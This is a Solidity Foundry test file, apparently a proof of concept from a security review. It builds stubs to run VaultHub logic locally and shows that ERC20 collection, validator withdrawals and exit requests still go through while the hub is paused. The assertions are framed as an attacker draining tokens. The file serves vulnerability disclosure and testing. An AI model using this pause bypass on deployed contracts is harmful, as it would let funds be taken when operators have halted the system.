// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

import "forge-std/Test.sol";

import {VaultHub} from "contracts/0.8.25/vaults/VaultHub.sol";
import {IStakingVault} from "contracts/0.8.25/vaults/interfaces/IStakingVault.sol";
import {IPinnedBeaconProxy} from "contracts/0.8.25/vaults/interfaces/IPinnedBeaconProxy.sol";
import {ILidoLocator} from "contracts/common/interfaces/ILidoLocator.sol";
import {ILido} from "contracts/common/interfaces/ILido.sol";
import {IHashConsensus} from "contracts/common/interfaces/IHashConsensus.sol";
import {IPredepositGuarantee} from "contracts/0.8.25/vaults/interfaces/IPredepositGuarantee.sol";
import {IVaultFactory} from "contracts/0.8.25/vaults/interfaces/IVaultFactory.sol";
import {IDepositContract} from "contracts/common/interfaces/IDepositContract.sol";
import {PausableUntil} from "contracts/common/utils/PausableUntil.sol";

/// -----------------------------------------------------------------------
/// Minimal stubs to drive the real VaultHub logic
/// -----------------------------------------------------------------------

contract LidoStub is ILido {
    uint256 internal _totalShares = 1_000_000 ether;

    // IERC20
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }

    // IVersioned
    function getContractVersion() external pure returns (uint256) { return 1; }

    // ILido specifics used by VaultHub
    function sharesOf(address) external pure returns (uint256) { return 0; }
    function getSharesByPooledEth(uint256 eth) external pure returns (uint256) { return eth; }
    function getPooledEthByShares(uint256 sh) external pure returns (uint256) { return sh; }
    function getPooledEthBySharesRoundUp(uint256 sh) external pure returns (uint256) { return sh; }
    function transferSharesFrom(address, address, uint256 amt) external pure returns (uint256) { return amt; }
    function transferShares(address, uint256 amt) external pure returns (uint256) { return amt; }
    function rebalanceExternalEtherToInternal(uint256) external payable {}
    function getTotalPooledEther() external pure returns (uint256) { return 0; }
    function getExternalEther() external pure returns (uint256) { return 0; }
    function getExternalShares() external pure returns (uint256) { return 0; }
    function mintExternalShares(address, uint256) external pure {}
    function burnExternalShares(uint256) external pure {}
    function getTotalShares() external view returns (uint256) { return _totalShares; }
    function getBeaconStat() external pure returns (uint256, uint256, uint256) { return (0, 0, 0); }
    function processClStateUpdate(uint256, uint256, uint256, uint256) external pure {}
    function collectRewardsAndProcessWithdrawals(
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256
    ) external pure {}
    function emitTokenRebase(
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256
    ) external pure {}
    function mintShares(address, uint256) external pure {}
    function internalizeExternalBadDebt(uint256) external pure {}
}

contract HashConsensusStub is IHashConsensus {
    function getIsMember(address) external pure returns (bool) { return true; }
    function getCurrentFrame() external pure returns (uint256, uint256) { return (0, type(uint256).max); }
    function getChainConfig() external pure returns (uint256, uint256, uint256) { return (0, 0, 0); }
    function getFrameConfig() external pure returns (uint256, uint256) { return (0, 0); }
    function getInitialRefSlot() external pure returns (uint256) { return 0; }
}

/// Minimal proxy to execute VaultHub logic with fresh storage (bypasses _disableInitializers on implementation)
contract SimpleProxy {
    address public immutable implementation;
    constructor(address _impl) { implementation = _impl; }
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    receive() external payable {}
}

contract PDGStub is IPredepositGuarantee {
    function pendingActivations(IStakingVault) external pure returns (uint256) { return 0; }
    function validatorStatus(bytes calldata) external pure returns (ValidatorStatus memory) {
        return ValidatorStatus({stage: ValidatorStage.NONE, stakingVault: IStakingVault(address(0)), nodeOperator: address(0)});
    }
    function proveUnknownValidator(ValidatorWitness calldata, IStakingVault) external pure {}
}

contract VaultFactoryStub is IVaultFactory {
    function deployedVaults(address) external pure returns (bool) { return true; }
}

contract OperatorGridStub {
    function vaultTierInfo(address)
        external
        pure
        returns (
            address nodeOperator,
            uint256 tierId,
            uint256 shareLimit,
            uint256 reserveRatioBP,
            uint256 forcedRebalanceThresholdBP,
            uint256 infraFeeBP,
            uint256 liquidityFeeBP,
            uint256 reservationFeeBP
        )
    {
        return (address(0xBEEF), 0, 1000 ether, 0, 0, 0, 0, 0);
    }

    function onMintedShares(address, uint256, bool) external pure {}
    function onBurnedShares(address, uint256) external pure {}
    function resetVaultTier(address) external pure {}
}

contract LazyOracleStub {
    function latestReportTimestamp() external view returns (uint256) { return block.timestamp; }
    function removeVaultQuarantine(address) external pure {}
}

contract LocatorStub is ILidoLocator {
    address public immutable lidoAddr;
    address public immutable factoryAddr;
    address public immutable pdgAddr;
    address public immutable gridAddr;
    address public immutable lazyOracleAddr;

    constructor(address _lido, address _factory, address _pdg, address _grid, address _lazyOracle) {
        lidoAddr = _lido;
        factoryAddr = _factory;
        pdgAddr = _pdg;
        gridAddr = _grid;
        lazyOracleAddr = _lazyOracle;
    }

    function accountingOracle() external pure returns (address) { return address(0); }
    function depositSecurityModule() external pure returns (address) { return address(0); }
    function elRewardsVault() external pure returns (address) { return address(0); }
    function lido() external view returns (address) { return lidoAddr; }
    function oracleReportSanityChecker() external pure returns (address) { return address(0); }
    function burner() external pure returns (address) { return address(0); }
    function stakingRouter() external pure returns (address) { return address(0); }
    function treasury() external pure returns (address) { return address(0); }
    function validatorsExitBusOracle() external pure returns (address) { return address(0); }
    function withdrawalQueue() external pure returns (address) { return address(0); }
    function withdrawalVault() external pure returns (address) { return address(0); }
    function postTokenRebaseReceiver() external pure returns (address) { return address(0); }
    function oracleDaemonConfig() external pure returns (address) { return address(0); }
    function accounting() external pure returns (address) { return address(0); }
    function predepositGuarantee() external view returns (address) { return pdgAddr; }
    function wstETH() external pure returns (address) { return address(0); }
    function vaultHub() external pure returns (address) { return address(0); }
    function vaultFactory() external view returns (address) { return factoryAddr; }
    function lazyOracle() external view returns (address) { return lazyOracleAddr; }
    function operatorGrid() external view returns (address) { return gridAddr; }

    function coreComponents() external pure returns (
        address elRewardsVault_,
        address oracleReportSanityChecker_,
        address stakingRouter_,
        address treasury_,
        address withdrawalQueue_,
        address withdrawalVault_
    ) {
        return (address(0), address(0), address(0), address(0), address(0), address(0));
    }

    function oracleReportComponents() external pure returns (
        address accountingOracle_,
        address oracleReportSanityChecker_,
        address burner_,
        address withdrawalQueue_,
        address postTokenRebaseReceiver_,
        address stakingRouter_,
        address vaultHub_
    ) {
        return (address(0), address(0), address(0), address(0), address(0), address(0), vaultHub_);
    }
}

/// Simple ERC20 for the sweep test
contract TokenStub {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// Minimal StakingVault implementation matching the checks in VaultHub.connectVault
contract StakingVaultStub is IStakingVault, IPinnedBeaconProxy {
    IDepositContract public override DEPOSIT_CONTRACT = IDepositContract(address(0));
    address public override owner;
    address private _pendingOwner;
    address public depositor_;
    bool public pausedDeposits;
    uint256 public availableBalance_;
    TokenStub public token;

    constructor(address _owner) {
        owner = _owner;
        token = new TokenStub();
    }

    receive() external payable { availableBalance_ += msg.value; }

    function initialize(address, address, address) external override {}
    function version() external pure returns (uint64) { return 1; }
    function getInitializedVersion() external pure returns (uint64) { return 1; }
    function withdrawalCredentials() external pure returns (bytes32) { return bytes32(0); }
    function pendingOwner() public view override returns (address) { return _pendingOwner; }

    function acceptOwnership() external override {
        require(msg.sender == _pendingOwner, "not pending");
        owner = _pendingOwner;
        _pendingOwner = address(0);
    }

    function transferOwnership(address _newOwner) public override {
        require(msg.sender == owner, "not owner");
        _pendingOwner = _newOwner;
    }

    function nodeOperator() external pure returns (address) { return address(0xBEEF); }
    function depositor() external view returns (address) { return depositor_; }
    function calculateValidatorWithdrawalFee(uint256) external pure returns (uint256) { return 0; }

    function fund() external payable override { availableBalance_ += msg.value; }
    function withdraw(address _recipient, uint256 _ether) external override {
        require(msg.sender == owner, "not owner");
        require(_ether <= availableBalance_, "insufficient");
        availableBalance_ -= _ether;
        (bool ok,) = _recipient.call{value: _ether}("");
        require(ok, "xfer failed");
    }

    function beaconChainDepositsPaused() external view returns (bool) { return pausedDeposits; }
    function pauseBeaconChainDeposits() external override { pausedDeposits = true; }
    function resumeBeaconChainDeposits() external override { pausedDeposits = false; }
    function depositToBeaconChain(Deposit calldata) external override {}

    function requestValidatorExit(bytes calldata) external override {}
    function triggerValidatorWithdrawals(bytes calldata, uint64[] calldata, address) external payable override {}
    function ejectValidators(bytes calldata, address) external payable override {}
    function setDepositor(address _depositor) external override { depositor_ = _depositor; }
    function ossify() external override {}
    function collectERC20(address _token, address _recipient, uint256 _amount) external override {
        require(msg.sender == owner, "not owner");
        TokenStub(_token).transfer(_recipient, _amount);
    }

    function availableBalance() external view returns (uint256) { return availableBalance_; }
    function stagedBalance() external pure returns (uint256) { return 0; }
    function stage(uint256 _ether) external override {}
    function unstage(uint256 _ether) external override {}
    function depositFromStaged(Deposit calldata, uint256) external override {}

    // IPinnedBeaconProxy
    function isOssified() external pure returns (bool) { return false; }
}

/// -----------------------------------------------------------------------
/// Tests
/// -----------------------------------------------------------------------
contract VaultHubPauseE2ETest is Test {
    VaultHub hub;
    StakingVaultStub vault;
    TokenStub token;

    address admin = address(0xA11CE);
    address pauser = address(0xBEEF);
    address attacker = address(0xCAFE);

    function setUp() public {
        LidoStub lido = new LidoStub();
        PDGStub pdg = new PDGStub();
        OperatorGridStub grid = new OperatorGridStub();
        VaultFactoryStub factory = new VaultFactoryStub();
        LazyOracleStub lazyOracle = new LazyOracleStub();
        LocatorStub locator = new LocatorStub(address(lido), address(factory), address(pdg), address(grid), address(lazyOracle));
        HashConsensusStub consensus = new HashConsensusStub();

        VaultHub impl = new VaultHub(ILidoLocator(address(locator)), ILido(address(lido)), IHashConsensus(address(consensus)), 10_000);
        SimpleProxy proxy = new SimpleProxy(address(impl));
        hub = VaultHub(payable(address(proxy)));
        hub.initialize(admin);
        bytes32 pauseRole = hub.PAUSE_ROLE();
        vm.startPrank(admin);
        hub.grantRole(pauseRole, pauser);
        vm.stopPrank();

        vault = new StakingVaultStub(attacker);
        token = vault.token();

        // prepare vault for connectVault: depositor and pending owner
        vm.prank(attacker);
        vault.setDepositor(address(pdg));
        vm.prank(attacker);
        vault.transferOwnership(address(hub)); // sets pendingOwner
        // ensure available balance >= CONNECT_DEPOSIT
        vm.deal(attacker, 2 ether);
        vm.deal(address(vault), 1 ether);
        vm.prank(attacker);
        vault.fund{value: 1 ether}();

        // connect (requires msg.sender == vault.owner == attacker)
        vm.prank(attacker);
        hub.connectVault(address(vault));

        // sanity: not paused initially
        require(!hub.isPaused(), "Hub should not be paused initially");

        // pause hub
        vm.prank(pauser);
        hub.pauseFor(1 days);
        require(hub.isPaused(), "Hub MUST be paused for tests");
    }

    function testCollectERC20BypassesPause() public {
        assertTrue(hub.isPaused(), "Hub must be paused");
        token.mint(address(vault), 1 ether);

        vm.prank(attacker);
        hub.collectERC20FromVault(address(vault), address(token), attacker, 0.5 ether);

        assertEq(token.balanceOf(attacker), 0.5 ether, "ERC20 drained while paused");
    }

    function testTriggerWithdrawalsBypassesPause() public {
        bytes memory pubkeys = hex"01";
        uint64[] memory amounts = new uint64[](0);

        vm.prank(attacker);
        hub.triggerValidatorWithdrawals(address(vault), pubkeys, amounts, attacker);
    }

    function testRequestExitBypassesPause() public {
        bytes memory pubkeys = hex"02";

        vm.prank(attacker);
        hub.requestValidatorExit(address(vault), pubkeys);
    }

    function testProtectedFunctionsRevertWhilePausedButBypassedOnVulnerableOnes() public {
        assertTrue(hub.isPaused(), "Hub must be paused");

        // Protected path: withdraw has whenResumed, should revert with ResumedExpected
        vm.prank(attacker);
        vm.expectRevert(PausableUntil.ResumedExpected.selector);
        hub.withdraw(address(vault), attacker, 0.1 ether);

        // Vulnerable paths still succeed
        token.mint(address(vault), 1 ether);
        vm.prank(attacker);
        hub.collectERC20FromVault(address(vault), address(token), attacker, 0.25 ether);
        assertEq(token.balanceOf(attacker), 0.25 ether, "ERC20 drained while paused");

        bytes memory pubkeys = hex"03";
        uint64[] memory amounts = new uint64[](0);
        vm.prank(attacker);
        hub.triggerValidatorWithdrawals(address(vault), pubkeys, amounts, attacker);

        vm.prank(attacker);
        hub.requestValidatorExit(address(vault), pubkeys);
    }

    function testPauseBypassAllowsFullSiphon() public {
        token.mint(address(vault), 100 ether);
        vm.prank(attacker);
        hub.collectERC20FromVault(address(vault), address(token), attacker, 100 ether);
        assertEq(token.balanceOf(attacker), 100 ether, "Attacker stole all airdrops despite pause");
    }
}
